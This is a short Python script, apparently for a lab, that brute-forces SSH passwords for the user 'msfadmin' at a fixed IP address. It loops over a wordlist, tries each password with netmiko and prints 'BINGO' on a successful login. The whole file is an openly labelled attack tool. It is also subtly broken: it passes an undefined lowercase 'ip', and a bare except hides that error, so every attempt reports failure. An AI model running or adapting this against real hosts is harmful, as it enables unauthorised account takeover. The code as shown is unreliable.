#!/usr/bin/python

from netmiko import Netmiko

wordlist = "word.txt"
user = "msfadmin"
IP = "11.11.11.171"
print("SSH Brute force Attack")
print("Target:", IP )

with open(wordlist,'r') as _wordlist:
    for _line in _wordlist:
        _pass = _line.strip("\n")

        try:
            sshconn = Netmiko(ip, username=str(user), password=str(_pass),device_type="linux")
            print("[+] BINGO - username: ", user, "Password: ", _pass)
            sshconn.disconnect()

        except:
            print("[-] FAIL - Username: ", user, "Password", _pass)


